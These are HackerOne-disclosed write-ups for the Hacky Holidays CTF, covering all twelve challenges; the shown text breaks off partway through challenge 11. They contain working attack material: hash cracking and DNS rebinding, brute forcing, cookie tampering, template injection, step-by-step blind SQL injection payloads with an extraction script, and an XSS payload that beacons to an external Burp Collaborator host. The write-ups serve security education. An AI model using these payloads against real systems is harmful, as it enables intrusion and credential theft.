Now after this we go to login page https://hackyholidays.h1ctf.com/attack-box and enter these credentials grinchadmin:s4nt4sucks we get our flag and final challenge .

{F1131557}

~~Grinch Recon Server Down~~

### flag{07a03135-9778-4dee-a83c-7ec330728e72}

# 12 Grinch HashingDns

Now Grinch got superfrustrated and decided to launch his final DDOS attack to target he made a script that would launch an attack to ip he restricted it with a check if ip resolves first time as 127.0.0.1 then attack woul be aborted

We began on https://hackyholidays.h1ctf.com/attack-box here we can see three ip and three urls so decoding 1st ip we can see 

```
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==

https://hackyholidays.h1ctf.com/attack-box/launch?payload={"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
```

each payload has ip and hash base64 encoded together if we manually try to change ip or change hashes the server would respond with
``` Invalid Protection Hash```  so here needed to generate hash for an ip to do so we needed to now hash password that is used server side I tried using hashcat with  hash:salt format to get the password here ip is our salt
```
5f2940d65ca4140cc18d0878bc398955:203.0.113.33
2814f9c7311a82f1b822585039f62607:203.0.113.53
5aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213
```
this gave us 
{F1131537} mrgrinch463 as password  now if we generate a hash and try IP such as 127.0.0.1 it would stop the attack detecting it as localhost here DNS rebinding will help us at first we need our IP to resolve to any ip other than localhost and then 127.0.0.1 here we use https://lock.cmpxchg8b.com/rebinder.html and enter IP1 as 192.168.0.1 and IP2 as 127.0.0.1 now we generate our hash using [Md5salthash](http://md5.my-addr.com/md5_salted_hash-md5_salt_hash_generator_tool.php) and then we encode the IP and send the payload this gives us back a attack URL upon loading after 2nd resolve this attacks 127.0.0.1 and thus we get our final flag & burn down whole grinch system and save the holidays

## Steps:
1. Using hashcat crack the password with the command
``` hashcat -a 0 -m 10 hash.txt ../../tools/payloads/wordlists/wordlistsl/rockyou.txt --show```
2.  Now we get password as ``` mrgrinch463``` 
3. Now we go to https://lock.cmpxchg8b.com/rebinder.html and generate a url for  dns rebinding 
{F1131540}
we get c0a80001.7f000001.rbndr.us 
4. Now to generate our hash we visit http://md5.my-addr.com/md5_salted_hash-md5_salt_hash_generator_tool.php and enter our url and password which generates us a hash of 60ff4921c1c7a927c06140d0a57c9d38 now we base64 encode this as

```
{"target":"c0a80001.7f000001.rbndr.us","hash":"60ff4921c1c7a927c06140d0a57c9d38"}
eyJ0YXJnZXQiOiJjMGE4MDAwMS43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiI2MGZmNDkyMWMxYzdhOTI3YzA2MTQwZDBhNTdjOWQzOCJ9
```

5.Now we send this as payload 
```
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiJjMGE4MDAwMS43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiI2MGZmNDkyMWMxYzdhOTI3YzA2MTQwZDBhNTdjOWQzOCJ9
```
which redirects us to 
{F1131543}  https://hackyholidays.h1ctf.com/attack-box/launch/d265d7796749f0d1ae59115fc9fef7a2
6.Upon  visiting the url we sucessfullly launch the attack against 127.0.0.1 and destroy grinch networks 
{F1131544}

{F1131545}

7.~~Take Down Grinch~~ 
### flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}

## Impact

...

---

### [CTF Writeup](https://hackerone.com/reports/1066233)

- **Report ID:** `1066233`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** h1-ctf
- **Reporter:** @a_l
- **Bounty:** - usd
- **Disclosed:** 2021-01-14T19:35:04.574Z
- **CVE(s):** -

**Vulnerability Information:**

Hi,
First of all, thanks for this amazing CTF!. 

I will post my writeup soon, it is time to sleep now :)
{F1129602}

By the way, the creator of challenge 11 is crazy.

## Impact

Grinch Network is finally down

**Summary (researcher):**

CTF Writeup:
=====================
This CTF was consisted of 12 challenges. Each day a new challenge was released by HackerOne.

Challenge 1 (Robots.txt):
---------------------
__Tools I used:__ Just my browser.

This challenge was really easy, I just checked the ```robots.txt``` file and got the flag.
{F1165514}

Challenge 2 (DOM Flag):
---------------------
__Tools I used:__ Just my browser.

As we can see in the ```robots.txt``` file, there is a "hidden" path ```/s3cr3t-ar3a```. Accessing this path reveals the following message:
{F1165520}

I started to search for interesting things in the DOM, by using the browser Inspect Element functionality, and I found both the flag, and the path for the next challenge.
{F1165523}

Challenge 3 (People Rater):
---------------------
__Tools I used:__ Just my browser.

We disclosed the path ```/apps``` in the previous challenge. 
__Note:__ From now on, all of the challenges, except challenge 11 and 12, will appear in the ```/apps``` page.

This challenge starts with a clickable list of buttons. Each button contains an unique value, which seems to be a base64 encoded value. 
Clicking on one of these buttons, causes my browser to send a HTTP GET request to ```/entry?id=``` endpoint, where the ```id``` GET parameter is set as the base64 encoded value of a specific button that I clicked on, as can be seen in the following pictures:

__This is an example of some requests:__
{F1165525}

__This is an example of 1 response:__
{F1165526}

I decoded one of the base64 values using the browser built-in Console. 
For example:
```atob('eyJpZCI6NX0=')``` => ```"{"id":5}"```

Then, I changed the ```id``` value to 1, and I encoded it back to base64:
```btoa('{"id":1}')``` => ```eyJpZCI6MX0=```

The final part is to access the ```/entry?id=eyJpZCI6MX0=``` endpoint, using our new base64 encoded value:
{F1165527}

Challenge 4 (Swag Shop):
---------------------
__Tools I used:__ Burp Suite.

This challenge starts with a page that contains 3 different items, which you can buy in the Gring swag shop, as can be seen here:
{F1165529}

After "playing" with the swag shop functionalities I found the following 3 API endpoints:

1./api/stock - this endpoint is used to fetch the 3 item details, such as the item name and the item price.
2./api/purchase - this endpoint can be used to buy items.
3./api/login - in order to buy items, you need to login. This endpoint is used to login to the system.

At this point, I noticed the /api/login endpoint did not enforce any kind of rate limitation, and therefore, I started to brute force the security credentials, using Burp Suite Intruder with a simple passwords wordlist. 
After few minutes, I started to brute force the ```/api/ ``` path, using Burp Suite Intruder with a simple API wordlist, in order to find some interesting endpoints. 

Using this technique, I found 2 additional endpoints:
1./api/user - accessing this endpoint gave me the following message: ```{"error":"Missing required fields"}```.
2./api/sessions - this was a really juicy endpoint which revealed all of the user sessions, as can be seen in the following picture:
{F1165530}

These sessions seems to be base64 encoded. One of these sessions contained a user UUID, as can be seen here:
{F1165532}
This UUID will be used shortly :)

Meanwhile, I ran another brute force attack, this time I tried to look for HTTP GET parameters for the /api/user endpoint. After few seconds, I discovered the ```uuid``` GET parameter which returned me the following error:
```{"error":"Could not find matching uuid"}```

So, I sent a HTTP GET request to /api/user endpoint using the disclosed UUID from the /api/sessions endpoint, and I got the flag:
{F1165533}

Challenge 5 (Secure Login):
---------------------
__Tools I used:__ Burp Suite, fcrackzip.

In this challenge we are given a login panel, as you can be seen here:
{F1165535}

First, I noticed there is no rate limitation, which means I should probably "brute force" my way in, but, how is that possible? I don't even know the username. 
Then, I saw the following error message: ```Invalid Username```.
It means the creator of this challenge gives us a hint about the way we should solve this challenge. In other word I need to brute force the username, then I will brute force the password of that username.
My first thoughts were about Timing Attack, but I decided to simply try to brute force the security credentials by using a Burp Suite Intruder.

I configured Burp Suite Intruder with a simple username list to brute force just the username, but I didn't launch the attack yet. I thought to myself, if I will manage to guess the username successfully, the next error message will probably be ```Invalid Password```.
Meaning I cannot filter out the server responses by the response length, because of the following:
```Invalid Username``` =>16 characters.
```Invalid Password``` => 16 characters.

__Note:__ the server always responses with ```HTTP 200 OK```.

Using the amazing Burp Suite Intruder Grep Extract functionality I could simply create a new filter, as can be seen here:
{F1165536}

and I executed my brute force attack in order to find the username:
{F1165537}

The username is ```access```.

Now, I can execute the 2nd brute force attack which will give me the password. Again, I used Burp Suite Intruder, this time with a simple password wordlist.
{F1165538}

The password is ```computer```.

As we can see the server sets the following cookie for us:
```eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0= ```.

At this point I noticed that the cookie is a base64 encoded value, so I decoded it, which gave me the following:

```eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=``` => ```{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}```.

Accessing the Secure Login website using this cookie led me to the following page:
{F1165539}

so I changed the base64 decoded value, specifically the ```"admin":false``` part to ```"admin":true```, and I base64 encoded it.

The new cookie base64 value looks like this:
```eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==``` => ```{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true}```.

I tried to access the website again, using the new cookie, and I received the following page:
{F1165540}

I downloaded this ```my_secure_files_not_for_you.zip``` zip file which contains the following 2 files:
{F1165541}

Trying to extract the zip file and read the flag, results in an error, due to the fact that the zip file is encrypted. However, this is a CTF and we should be able to crack the password :), so I used the ```fcrackzip ``` tool with the known ```rockyou.txt ``` password wordlist file, and I was able to break the password to extract the flag:
{F1165542}

In addition, this is the ```xxx.png ``` file content:
{F1165543}

Challenge 6 (My Diary):
---------------------
__Tools I used:__ Burp Suite.

When I accessed this challenge, I noticed it automatically redirects me to ```/?template=entries.html```, as can be seen here:
{F1165544}

It seems like the server uses ```template ``` GET parameter to "include" the ```entries.html ``` file, so I decided to use Burp Suite Intruder in order to brute force for existing files in the server. I configured Burp Suite Intruder with the Cluster Bomb attack type as can be seen here:
{F1165545}

After some time, it found the ```index.php ``` file, so I simply used it as the ```template ``` GET parameter value, and was able to leak the PHP source code of the challenge, as can be seen here:
{F1165546}

It seems like the goal is to read the ```secretadmin.php ``` file, since my input is used in the ```file_get_contents ``` function. But, first I simply tried to access it directly, instead of using the ```template``` GET parameter :)
It did not work, and I got the following message: ```You cannot view this page from your IP Address```. 
At this point, I knew I should read this file content by using the ```template ``` GET parameter, but I just wanted to check if I can bypass this restriction and access it directly - I could not.

Back to the PHP source code (modified with echo):
```
1.$page = $_GET["template"];
2.$page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
3.echo $page;
4.$page = str_replace("admin.php","",$page);
5.echo $page;
6.$page = str_replace("secretadmin.php","",$page);
7.echo $page;
```
The goal is to reach line 6 where $page contains the string ```secretadmin.php```.
As we can see in line 2, $page is filtered in such a manner that will cause it to contain some specific characters only.

We can split this challenge into two small challenges:
1.The first goal is to pass line 4 where we have the value ```admin.php``` in $page.
2.The 2nd challenge will be to reach line 6, where $page is equal to secretadmin.php.

Solving the first challenge:
/?template=adminadmin.php.php

PHP code (output):
```
1.$page = $_GET["template"];
2.$page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
3.echo $page; //adminadmin.php.php
4.$page = str_replace("admin.php","",$page);
5.echo $page; //admin.php
6.$page = str_replace("secretadmin.php","",$page);
7.echo $page; //admin.php
```

Solving the 2nd challenge:
/?template=secretadminsecretadminadmin.php.php.php

PHP code (output):
```
1.$page = $_GET["template"];
2.$page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
3.echo $page; //secretadminsecretadminadmin.php.php.php
4.$page = str_replace("admin.php","",$page);
5.echo $page; //secretadminsecretadmin.php.php
6.$page = str_replace("secretadmin.php","",$page);
7.echo $page; //secretadmin.php
```

Now we can access the website using ```/?template=secretadminsecretadminadmin.php.php.php```, which will give us the ```secretadmin.php``` file content:
{F1165548}

By the way, we can see why I could not read the file directly here:
{F1165549}

Challenge 7 (Hate Mail Generator):
---------------------
__Tools I used:__ Burp Suite.

In this challenge we can view and create campaigns. Our goal, as usual, is to find the hidden flag.
There is only one campaign in this challenge, name as Guess What, which we can access to, as you can see here:
{F1165557}
Clicking on the Preview button, moves us to the actual campaign page, where the Markup section of this campaign is rendered. For example:
{F1165558}

I mentioned that we can also create our campaigns, well.. this is not entirely true. We can write our campaign and we can also preview it, but we cannot publish it :(
I noticed the Markup section of the campaign is vulnerable to XSS:
{F1165562}

So my plan was to exploit this XSS vulnerability, and publish my campaign, which will be triggered once the admin of this challenge visit it. Then, I will be able to extract the admin cookies and also the DOM, which might contain sensitive data. But, it seems like there is no way to publish my campaign so I tried something else.

I started to "play" with the Markup section of my campaign, for example, I sent this input:
{F1165563}

Which gave me the following output:
{F1165564}

Clicking the Preview button causes my browser to send a HTTP POST request with the following data:
```preview_markup=Hello+%7B%7Bname%7D%7D+....&preview_data=%7B%22name%22%3A%22Alice%22%2C%22email%22%3A%22alice%40test.com%22%7D ```

At this point, I started to test some SSTI attacks which did not work, so I took at break from this challenge. 
Few hours later I started again, and this time I noticed the challenge campaign, Guess What, contains the following interesting data: ```{{template:cbdj3_grinch_header.html}}```.
This "template" string ```{{template:file}}``` is a special keyword, it enables us to retrieve data. More specifically, the server will try to get the {{template:file}} for us.

I crafted and sent a simple campaign review request to the server, as follows:
```preview_markup={{template:test}}&preview_data= ```
The output:
```Cannot find template file /templates/test```

It seems like the server attempts to "load" the ```test``` file from /templates folder. so I simply tried to access this folder:
{F1165565}

There is a "secret" template file ```38dhs_admins_only_header.html``` which we did not know about. Trying to access it directly gave me HTTP 403 Forbidden, so I tried to read this file using the campaign preview functionality.

I sent the following Markup data:
```preview_markup={{template:38dhs_admins_only_header.html}}&preview_data= ```
The output:
```You do not have access to the file 38dhs_admins_only_header.html```

Our goal is clear, we just need to read that file!
I spent some time on Path Traversal techniques and some other techniques which did not work at all. After some time I thought about using the HTTP POST parameter ```preview_data```, in order to "pass" this forbidden HTML file to the ```preview_markup``` template.

The plan was to create a variable, using the ```preview_data``` POST parameter, which will "point" to the string "38dhs_admins_only_header.html", and then I could simply replace that variable with the forbidden file, but it did not work as I expected. After trying some other things I got the following output for this request:

The request:
```preview_markup={{a}}&preview_data={"a":["b","c"]} ```

The output:
```Array ```

I knew this was the way to solve this challenge, I just had to find the right way to "point" to that forbidden file. After several minutes I tried the following payload:

The request:
```preview_markup={{a}}&preview_data={"a":"{{template:38dhs_admins_only_header.html}}"} ```

The output:
{F1165566}

Challenge 8 (Forum):
---------------------
__Tools I used:__ Burp Suite.

In this challenge we need hack our way in to the admin section.
Accessing the main page of the challenge gives us the following page:
{F1165567}

I spent some time on this website, gathering information such as the username grinch and max. I also tried to brute force their security credentials using Burp Suite Intruder with a simple password wordlist, but I failed to do so.

So, I decided to execute a brute force attack on the path URI, in order to find some hidden endpoints. I configured my Burp Suite Intruder with a simple wordlist of known directories, and I had a hit!
I found the hidden ```/phpmyadmin``` endpoint, as you can see here:
{F1165568}

I tried to brute force my way in using Burp Suite Intruder again using the usernames grinch and max, but it did not work. 
At this point, I took a break from this challenge, and I even solved the next challenge before I solved this one. I came back to this challenge and I tried to look for more hidden endpoints using a bigger wordlist, and I also tried to brute force grinch, and max security credentials, again, using a bigger password wordlist, but it did not work for me.

I entered the "Nice Things To Do" section in the forum and I saw the message: 
```There are no posts in this section ```.

I tried to search this message in github and I found the following:
{F1165569}
Grinch-Networks!!

I started to search for interesting data and I found the database security credentials inside the ```/models/Db.php``` file:
{F1165570}

I tried to use these security credentials in order to login to the /phpmyadmin panel, and it worked!. Inside the phpmyadmin I found the security credentials of grinch, and max, but there were not stored as a plaintext:
{F1165571}

It seems like it saves a MD5 hash of their password, so the first thing I tried to do was to google grinch hash:
{F1165572}

As you can see this MD5 hash is saved in a known MD5 hash list, or someone else already searched for this hash, and therefore, it is saved in this website :)

I tried to login to the forum using Grinch and BahHumbug as the password and it worked:
{F1165573}

Inside the admin section I found the flag:
{F1165574}

Challenge 9 (Evil Quiz):
---------------------
__Tools I used:__ Burp Suite, evilquiz.py (created by me).

This challenge starts by asking for our name:
{F1165575}

__Note:__ you can also see the Admin button in the top right side corner of the picture. This button leads to the admin panel login.

After we submit our name to the server, it enables us to answer some questions, and finally we can see our score by accessing the ```/score``` endpoint:
{F1165576}

As we can see, according to the message, there is only 1 other player with the same name as me (test-for-writeup).
It looks like the server executes some sort of "count" SQL query which might look like this:
```SELECT COUNT(column_name) FROM table_name WHERE name='test-for-writeup'; ```

I tried to change my name to ```test-for-writeup'or'1'='1 ```, by sending a HTTP POST request to /evil-quiz endpoint:
{F1165577}

As you can see, now there are 1213999 other players with the same name as mine, because I successfully manipulated the SQL query by using the ```'or'1'='1 ``` input, this attack vector is also known as a SQL injection. 
More specifically, The vulnerability in this challenge is known as a Blind SQL injection, which is also classified as a "second order" type. Meaning we inject our "malicious" payload in the ```/evil-quiz``` endpoint, and our malicious payload is only executed when we access the ```/score``` endpoint.

Our goal is clear, we need to dump the whole database :D
By exploiting this vulnerability we can actually dump the whole database content, for instance, I can "ask" the database series of "questions", which will help me to "slowly" pull out the its whole content.

But first, we need to find what is type of this database. I simply "asked" the database the following "questions":

Input:
```test-for-writeup'or'1'='1'-- ```
Output:
```There is 0 other player(s) with the same name as you! ```
This might be a PostgreSQL or a Microsoft SQL, but it is definitely not Oracle.

Input:
```test-for-writeup'or'1'='1'--+ ```
Output:
```There is 1213999  other player(s) with the same name as you! ```
This must be MySQL.

The next "question" we want to "ask" is how many columns the current table has?
we can do that by using the "order by" keyword, or just using the UNION operator. Using the "order by" keyword is possible due to the fact that we do not actually need the column names, but we can sort them out using their index as follows:

Input:
```test-for-writeup'or'1'='1'+order+by+1--+ ``` 
Output:
```There is 1213999  other player(s) with the same name as you! ```.

Input:
```test-for-writeup'or'1'='1'+order+by+1,2--+ ```
Output:
```There is 1213999  other player(s) with the same name as you! ```.

Input:
```test-for-writeup'or'1'='1'+order+by+1,2,3--+ ```
Output:
```There is 1213999  other player(s) with the same name as you! ```.

Input:
```test-for-writeup'or'1'='1'+order+by+1,2,3,4--+ ```
Output:
```There is 1213999  other player(s) with the same name as you! ```.

Input:
```test-for-writeup'or'1'='1'+order+by+1,2,3,4,5--+ ```
Output:
```There is 0 other player(s) with the same name as you! ```.


__There are 4 columns in the current table__.

In order to pull out data we will use the ```UNION``` operator, but we also need to verify the type of the column ,which we are going to inject our payload in, is the same type of the data we are going to retrieve. 

We are going to pull out "string" type data, and column 4 supports this type, as we can see here:

Input:
```test-for-writeup'+AND+'1'='2'+union+select+NULL,NULL,NULL,'a'--+ ```
Output:
```There is 1 other player(s) with the same name as you! ```.

Now, we can start to pull out the table names from the database. 
First, I manually checked for few specific tables such as flag, secret, and admin.
If there are exist, we do not need to pull out table names from the database, maybe :)

I did it by injecting the following payload as my name:

Input:
```test-for-writeup'+AND+'1'='2'+union+select+NULL,NULL,NULL,table_name+from+information_schema.tables+where+table_name+LIKE+'admin%'--+ ```
Output:
```There is 1 other player(s) with the same name as you! ```.

I found out that there is 1 table which __starts__ with the name ```admin``` so I changed my query in order to know for sure if the table name is equal to admin:

Input:
```test-for-writeup'+AND+'1'='2'+union+select+NULL,NULL,NULL,table_name+from+information_schema.tables+where+table_name+='admin'--+ ```
Output:
```There is 1 other player(s) with the same name as you! ```.

The table name is indeed admin!

It is time to pull out the admin table columns:
Again, I tried to find a "shortcut" and guess the column names, for example, there might be a username and a password columns right?

I injected the following payloads:

Input:
```test-for-writeup'+AND+'1'='2'+union+select+NULL,NULL,NULL,column_name+from+information_schema.columns+where+table_name='admin'+and+column_name='username'--+ ```
Output:
```There is 1 other player(s) with the same name as you! ```.

Input:
```test-for-writeup'+AND+'1'='2'+union+select+NULL,NULL,NULL,column_name+from+information_schema.columns+where+table_name='admin'+and+column_name='password'--+ ```
Output:
```There is 1 other player(s) with the same name as you! ```.

There are username and password columns :D

It is time to pull out their content. This time I wrote a simple python script to do that for me.
This script simply exploits the Blind SQL injection vulnerability, and fetching the results (true or false) from the ```/score``` endpoint, as I mentioned this vulnerability is classified as a second-order injection.

Before I even started to write the script, I tried to check if the username is grinch or admin by sending the following payload as my name:

Input:
```test-for-writeup'+AND+'1'='2'+union+select+NULL,NULL,NULL,username+from+admin+where+username='grinch'--+ ```
Output:
```There is 0 other player(s) with the same name as you! ```.

Input:
```test-for-writeup'+AND+'1'='2'+union+select+NULL,NULL,NULL,username+from+admin+where+username='admin'--+ ```
Output:
```There is 1 other player(s) with the same name as you! ```.

The username is admin, and therefore, I just my script to leak the admin password. For now there is no need to search for the username.

The script is attached to this writeup, and its name is evilquiz.py.
A quick review of the "core" query of my script:

```
requests.post("https://hackyholidays.h1ctf.com/evil-quiz", headers=headers,data={"name":"name=test-for-writeup' AND 1=2 union select 1,2,3,password from admin where username='admin' and password LIKE '"+found+str(bf[i])+"%'-- "})
```

As you can see, I will leak the whole password by using the LIKE operator:
{F1165578}

The password is __s3cret_p4ssw0rd-$__

I tried to login to the admin panel using the leaked security credentials and I failed :o
After few seconds I tried to send the following payloads as my name:

Input:
```name=test-for-writeup'+AND+1=2+union+select+1,2,3,password+from+admin+where+username='admin'+and+password+LIKE+'s3cret_p4ssw0rd-$'--+ ```
Output:
```There is 1 other player(s) with the same name as you! ```.

Input:
```name=test-for-writeup'+AND+1=2+union+select+1,2,3,password+from+admin+where+username='admin'+and+password+LIKE+'S3cret_p4ssw0rd-$'--+ ```
Output:
```There is 1 other player(s) with the same name as you! ```.

It seems like I forgot about case sensitive, so I manually tested for that. For example:

Input:
```name=test-for-writeup'+AND+1=2+union+select+1,2,3,password+from+admin+where+username='admin'+and+ascii(substr(password,1,1))=ascii('s')--+ ```
Output:
```There is 0 other player(s) with the same name as you! ```.

Input:
```name=test-for-writeup'+AND+1=2+union+select+1,2,3,password+from+admin+where+username='admin'+and+ascii(substr(password,1,1))=ascii('S')--+ ```
Output:
```There is 1 other player(s) with the same name as you! ```.

The first letter is capital S :)

At the end I got: ```S3creT_p4ssw0rd-$```
I logged in to the admin panel and I got the flag:
{F1165579}

Challenge 10 (Signup Manager):
---------------------
__Tools I used:__ Burp Suite.

The challenge starts with a simple page where we can login, and sign up to the system:
{F1165580}

Using Burp Suite, I quickly noticed this HTML comment at the start of the page:
```<!-- See README.md for assistance -->```

I tried to access this file and it worked:
{F1165581}

According to the ```README.md``` file:
1.There is a file name ```users.txt```, which probably contains some information about the users (might be interesting).
2.The default credentials are admin:password (I logged in using these credentials and it was a dead end)
3.In order to be an admin the last character should be Y? (interesting).
4.Also there is a file name ```signupmanager.zip```, which we might be able to download if not moved.
5.There are ```user.php``` and ```admin.php``` files.

My first approach was to create an account, and login to this account. By doing so I got the following message:
{F1165582}

I tried to access ```admin.php``` file and I received the following message:
```You cannot access this page directly```.

I had a plan! it was perfect plan!
As we can see the message I received when I logged in to my account, says:
```We'll have a look into you and see if you're evil enough to join the grinch army! ```
In other words, someone (the admin) will probably look at my profile somewhere in this website, and I have to create an account which contains XSS payloads in every possible location. 
Then, once the admin will visit the page which contains my malicious payload, I will be able to execute arbitrary JavaScript on its browser and fetch sensitive data. I might even be able to visit admin.php, who knows? By the way, this attack is known as Blind Stored XSS. 

So I created a new account with the following payload in every field:
```<img src=x onerror='document.location="//f9pu6rt561v3sw6jckr01l41jspid7.burpcollaborator.net"'>```

I waited few minutes and nothing happened. Then I remembered the ```signupmanager.zip``` file which I might be able to download. I tried to download this file and it worked, they did not move the file. 
At this moment, I knew the Blind Stored XSS is not going to solve this challenge I have to focus on this zip file.

This zip file contained the whole website source code, it was amazing!
I started to go over the code and understand this system.
In addition, I hosted a PHP server locally where I ran the challenge code. Also, I modified some specific parts in the code.
For example, I added some ```var_dump``` function calls and ```echo``` statements in the buildUsers function, as you can see here:
{F1165583}

I also tampered with the ```users.txt``` file, then I just registered and Inspected the output which was modified by me, as can be seen in the following picture:
{F1165584}

As I can see both in the code and in the ```users.txt```, the regular user string ends with the "N" character.
The challenge is to somehow manipulate the registration functionality, and cause the string of my account to end with the "Y" character.

To be honest, I solved it quickly.
I knew I was looking for a "Off-by-one" vulnerability. As we can see by the code, our input is very limited:
{F1165585}

The first place I was looking at was the ```$random_hash``` and the ```$password``` variables, as they are seems to be not limited, but, then I noticed I cannot control them because they both hold a MD5 hash, which is also limited to 32 bytes.
After few minutes, I noticed the ```$age``` variable, which is the only variable, except ```$random_hash```, and ```$password```, that is being modified before its assignment:
{F1165586}

My payload is limited to 3 characters, and also must return true when ```is_numeric``` function is called (according to the code).

I tried the following things:
{F1165587}
It worked!

I can use ```9e9``` which is a 3 character long, and also apply for the ```is_numeric```.
Now I have the ability insert more characters via the ```$age``` variable, which will eventually "push" other variables characters location in my user string!.
In order to exploit this vulnerability I just need to fill my last name with some YYYY... characters.

Local demo:
{F1165593}

Exploited the vulnerability in the CTF environment:
{F1165588}

Challenge 11 (Recon Server):
---------------------
__Tools I used:__ Burp Suite, sqlmap, recon.py (created by me).

The challenge starts with the following page:
{F1165598}

As you can see, there are three recon albums which we can access to:
1.Xmas 2020
2.Xmas 2019
3.Xmas 2018

Accessing one of these albums, for example, the Xmas 2020, moves us to the following endpoint:
```/album?hash=jdh34k ```

When this endpoint is accessed using the ```hash ``` GET parameter value as ```jdh34k ```, we get three pictures.
These pictures are embedded to the page by the following way:
{F1165599}

Here is an URL of one of these pictures:
```/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzliODgxYWY4YjMyZmYwN2Y2ZGFhZGE5NWZmNzBkYzNhLmpwZyIsImF1dGgiOiJlOTM0ZjQ0MDdhOWRmOWZkMjcyY2RiOWMzOTdmNjczZiJ9 ```

I noticed the ```data``` GET parameter value is a base64 encoded value, so I decoded it:

This is the decoded value of the aforementioned base64 string:
```{"image":"r3c0n_server_4fdk59\/uploads\/9b881af8b32ff07f6daada95ff70dc3a.jpg","auth":"e934f4407a9df9fd272cdb9c397f673f"} ```

As we can see this is a JSON format which contains the two following keys:
1.image
2.hash

The first thing we can learn from this JSON is the folder ```/uploads ``` which has the actual images. I tried to manually access the ```/uploads``` folder, but I failed to do so (HTTP 403 Forbidden). Then, I tried to access the ```9b881af8b32ff07f6daada95ff70dc3a.jpg``` image file directly, but I received the following error message:
```Image cannot be viewed directly```.

Back to the JSON:
The second thing I tried was to change the path inside the ```image ``` value, to something else. For example:
1.I tried to change it to other existing image file - failed due to ```invalid authentication hash ```.
2.I tried to use some Path Traversal techniques - failed due to ```invalid authentication hash ```.
3.I also tried to manipulate the ```hash``` value, so the server validation will pass, but it did not work - failed due to ```invalid authentication hash```.
4.I tried to change the form of this JSON keys to arrays - failed due to ```Invalid data format ```.
5.I also tried to send the ```image``` key twice, with one correct ```hash``` (vice versa) - failed ```invalid authentication hash ```.
6.I even tried to guess other "hidden" keys, using brute force by the Burp Suite extension ```Turbo Intruder ```.

It seems like the goal is not so clear, I had no idea what to do, so I started all over again.
This time I noticed the following message in the first page of the challenge:
```We are currently developing an API, apologies for anything that doesn't work quite right ```.
I simply accessed ```/api ``` endpoint and it worked:
{F1165624}

Then, I tried to brute force for "hidden" API endpoints using Burp Suite Intruder with a simple API wordlist.
each request got the same response:
```{"error":"This endpoint cannot be visited from this IP address"} ```

At this point, I tried several things such as adding some ```X- ``` HTTP headers to my requests.
For instance, the ```X-Forwarded-For ``` HTTP header with the value 127.0.0.1. I also attempted to abuse hop-by-hop headers, but still nothing.

I had a plan but I did not know how to execute it. My plan was to execute the brute force attack for the ```/api/ ``` endpoint, using the ```/picture ``` endpoint.
As far I as know the ```/picture ``` endpoint causes the server to fetch the desired image for me. Meaning the __server__ performs the request, which will bypass the ```{"error":"This endpoint cannot be visited from this IP address"} ``` error message. But, I have to somehow bypass the ```hash``` restriction.

I had no idea how to manipulate the ```hash``` validation, so I checked again all of the endpoints I already know. Maybe I missed something. Few seconds later, I realized that I missed the ```/album?hash=``` endpoints.
I tried to tamper with the ```hash``` GET parameter value in any way I know. I decided to execute ```sqlmap``` tool in order to find SQL injection vulnerability, and I took a break a long break.

After few hours, I noticed that the ```sqlmap``` discovered that ```hash``` GET parameter is vulnerable to a Blind SQL Injection attack! :)
Now, I can dump the whole content of the database, and maybe I will find the flag!.
However, it makes no sense to find the flag in the database, since I did not use the ```/api/ ``` endpoints at all.

I launched ```sqlmap ``` which gave me the following information:
There are two databases:
1.recon
2.information_schema

I decided to focus on the ```recon``` database, and therefore, I reconfigured ```sqlmap ```, and relaunched the attack:
Several minutes later, I had the following data:

```
Database: recon
Table: photo
[6 entries]
+----+----------+--------------------------------------+
| id | album_id | photo                                |
+----+----------+--------------------------------------+
| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |
| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |
| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
+----+----------+--------------------------------------+

Database: recon
Table: album
[3 entries]
+----+--------+-----------+
| id | hash   | name      |
+----+--------+-----------+
| 1  | 3dir42 | Xmas 2018 |
| 2  | 59grop | Xmas 2019 |
| 3  | jdh34k | Xmas 2020 |
+----+--------+-----------+
```

Noticed the ```hash ``` key of the JSON data, which was used in order to validate the ```image ``` value, is not stored in the database o_o. Meaning the server somehow calculates this hash on the fly.
I had to guess how things work behind the scenes.
My guess was:
1.I access the ```/album?hash=jdh34k ``` endpoint.
2.The server executes a SQL query, which attempts to find what is the ```id``` of that ```hash ``` in ```album ``` table.
In this case the hash ```jdh34k``` would be ```id ``` 3.
```
| id | hash   | name      |
+----+--------+-----------+
| 3  | jdh34k | Xmas 2020 |
```
3.Then the server executes another query, using that output, and it looks in the ```photo``` table, specifically on the ```album_id ``` column, in order to fetch all of the ```photo ``` column content that are related to this ```album_id ```.
In our case:
```
| id | album_id | photo                                |
+----+----------+--------------------------------------+
| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
